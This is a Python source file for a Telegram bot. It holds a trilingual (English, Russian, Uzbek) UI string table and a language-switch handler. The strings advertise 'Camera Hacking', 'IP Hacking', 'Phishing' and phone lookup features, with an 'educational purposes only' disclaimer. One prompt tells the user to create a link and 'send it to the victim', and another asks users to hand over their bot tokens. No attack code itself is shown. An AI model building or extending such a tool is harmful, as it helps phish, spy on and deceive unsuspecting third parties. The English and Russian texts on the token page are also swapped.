from telebot import types
from create_bot import bot

def language_selection_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    buttons = [
        types.InlineKeyboardButton("🇬🇧 English", callback_data='lang_en'),
        types.InlineKeyboardButton("🇷🇺 Русский", callback_data='lang_ru'),
        types.InlineKeyboardButton("🇺🇿 O'zbekcha", callback_data='lang_uz')
    ]
    markup.add(*buttons)
    return markup




def get_text(key, language):
    translations = {
        'start_message': {
            'en': "Welcome! Please select an option below:",
            'ru': "Добро пожаловать! Выберите один из вариантов ниже:",
            'uz': "Xush kelibsiz! Iltimos, quyidagi variantlardan birini tanlang:"
        },
        'main_menu_caption': {
            'en': "Main menu\n\n🆔 Your ID: {id}\n👤 Your name: {name}",
            'ru': "Главное меню\n\n🆔 Ваш ID: {id}\n👤 Ваше имя: {name}",
            'uz': "Asosiy menyusi\n\n🆔 Sizning ID: {id}\n👤 Sizning ismingiz: {name}"
        },
        'back_btn': {
            'en': 'Back',
            'ru': 'Назад',
            'uz': 'Orqaga'
        },
        'contacnt_btn': {
          'en': 'Contact to Developer',
          'ru': 'Связь с админом',
            'uz': 'Admin bilan bog\'lanish'
        },
        'camera_btn': {
          'en': '👨‍💻 Camera Hacking',
          'ru': '👨‍💻 Взломать камеру',
          'uz': '👨‍💻 Kamera hacklash'
        },
        'ip_btn': {
          'en' : '📍 IP Hacking',
          'ru': '📍 Пробив по IP',
            'uz': '📍 IP hacklash'
        },
        'cerate_bot_btn': {
            'en': 'Create bot',
            'ru': 'Создать бота',
            'uz': 'Bot yaratish'
        },
        'language_btn': {
            'en': '🌐 Language',
            'ru': '🌐 Язык',
            'uz': '🌐 Til'
        },
        'searchPhone_btn': {
            'en': '🔍 SearchPhone',
            'ru': '🔍 Поиск номера',
            'uz': '🔍 Raqam qidirish'
        },
        'searchUser_btn': {
            'en': '🔍 SearchUser',
            'ru': '🔍 Поиск человека',
            'uz': '🔍 Odami qidirish'
        },
        'cameraHack_page': {
            'en': "Create the link and send it to the victim\n\n {link}",
            'ru': 'Создайте ссылку и отправьте жертве \n\n {link}',
            'uz': 'Havolani yaratib, unga qurbaningizga yuboring\n\n {link}'
        },
        'ipHack_page': {
            'en': 'Send me IP address',
            'ru': 'Отравьте сюда IP адрес',
            'uz': 'IP manzilini yuboring'
        },
        'chatGpt_page': {
            'en': """You are in dialogue with ChatGPT 4\\. Send your request in text format\\.
> Press\\ __Back__\\ to exit\\.
""",
            'ru': """Вы находитесь в диалоге с ChatGpt 4\\. Отправьте свой запрос в текстовом формате\\. 
> Нажмите\\ __Назад__\\ чтобы выйти\\.""",
            'uz': """Siz ChatGpt 4 bilan muloqotda ekansiz\\. So'rovingizni matn shaklida yuboring\\.""",
        },
        'acountHack_btn': {
            'en': '🚫 Phishing',
            'ru': '🚫 Фишинг',
            'uz': '🚫 Phishing'
        },
        'acountHack_page': {
            'en': 'Test link',
            'ru': 'Тестовая ссылка',
            'uz': 'Test ssilka'
        },
        'contactMe_page': {
            'en': 'send me question',
            'ru': 'есть вопрос? можешь написать его сюда',
            'uz': 'savol yuborish'
        },
        'pagination': {
            'en': '➡️ Next',
            'ru': '➡️ Вперед',
            'uz': '➡️ Keyingi'
        },
        'tts_page': {
            'en': 'Send me some text\n\n--click on back to leave this page',
            'ru': 'Отправьте мне текст\n\n--Нажмите back чтобы завершить',
            'uz': 'Matn yuboring\n\n--Chiqish uchun orqaga bosing'
            
        },
        'cameraHackBtn': {
            'en': 'Create Link',
            'ru': 'Создать ссылку',
            'uz': 'ssilka yaratish' 
            
        },
        'ipError': {
            'en': '> ERROR\\. enter a correct IP address\\.',
            'ru': '> Ошибка\\. Введите действительный IP адрес\\.'  ,
            'uz': "> XATO\\. To'gri IP manzilini kiriting\\."
        },
        'warrning': {
            'en': '''
If you use this bot, you agree to be bound by our terms.
This bot is for educational purposes only.
I am not responsible for any illegal activities that may occur as a result of using this bot.
If you use this bot, you do so at your own risk.
            ''',
            'ru': '''Если вы используете этого бота, вы соглашаетесь соблюдать наши условия.
Этот бот предназначен только для образовательных целей.
Я не несу ответственности за любые незаконные действия, которые могут произойти в результате использования этого бота.
Если вы используете этого бота, вы делаете это на свой страх и риск.''',
            'uz': '''Agar siz ushbu botdan foydalansangiz, bizning shartlarimizga rozilik bildirasiz.
Bu bot faqat taʼlim maqsadlarida.
Men ushbu botdan foydalanish natijasida yuzaga kelishi mumkin bo'lgan har qanday noqonuniy harakatlar uchun javobgar emasman.
Agar siz ushbu botdan foydalansangiz, buni o'zingizning xavf-xataringiz ostida qilasiz.'''

        },
        'thanks': {
            'en': 'Thanks',
            'ru': 'Спасибо',
            'uz': 'Rahmat'
        },
        'phone_user': {
            'en': '🔍 Enter the phone number you want to search for',
            'ru': '🔍 Отправьте номер телефона',
            
        },
        'search_user': {
            'en': '🔍 soon',
            'ru': '🔍 Скоро',
            'uz': '🔍 Tez orada'
        },
        "subscribe": {
            'en': "Subscribe",
            'ru': "Подпишитесь",
            'uz': "Kanalga obuna bo'ling"
        },
        
        'create_bot': {
            'en': 'Create bot',
            'ru': 'Создать бота',
            'uz': 'Bot yaratish'
        },
        'create_bot_page': {
            'en': """
🇷🇺 Как создать своего бота и отправить токен:

Перейдите в Telegram и найдите @BotFather.

Напишите команду /newbot и следуйте инструкциям (введите имя и юзернейм бота).

Получите токен (длинная строка вроде 123456:ABC-DEF...).

Отправьте этот токен сюда, чтобы бот начал работать.
            """,
            'ru': """
🇬🇧 How to create your own bot and send the token:

Open Telegram and search for @BotFather.

Type /newbot and follow the instructions (choose a name and a username).

You will get a token (a long string like 123456:ABC-DEF...).

Send this token here to activate your bot.
            """,
            'uz': """
🇺🇿 Bot yaratish va token yuborish:

Telegram oching va @BotFather botini qidiring.

/newbot deb yozing va ko‘rsatmalarga amal qiling (nom va username tanlang).

Sizga token beriladi (123456:ABC-DEF... kabi).

Shu yerga tokenni yuboring — botingiz ishga tushadi.
            """,
            
        },        
        "statistics": {
                'en': "📊 Your bot statistics:\n\n💬 Total messages: {total_messages}\n\n👤 Users: {total_users}",
                'ru': "📊 Статистика вашего бота:\n\n💬 Всего сообщений: {total_messages}\n\n👤 Пользователей: {total_users}",
                'uz': "📊 Bot statistikasi:\n\n💬 Jami xabarlar: {total_messages}\n\n👤 Foydalanuvchilar: {total_users}",
            },
    }
    return translations.get(key, {}).get(language, key)




@bot.callback_query_handler(func=lambda call: call.data == 'change_language')
async def change_language(call):
    
    
    markup = language_selection_keyboard()
    img = open('./img/main.jpeg', 'rb')
    caption_text = "Select your language / Выберите язык:"
    media = types.InputMediaPhoto(media=img, caption=caption_text)
    
    await bot.edit_message_media(chat_id=call.message.chat.id, message_id=call.message.id, media=media, reply_markup=markup)
    img.close()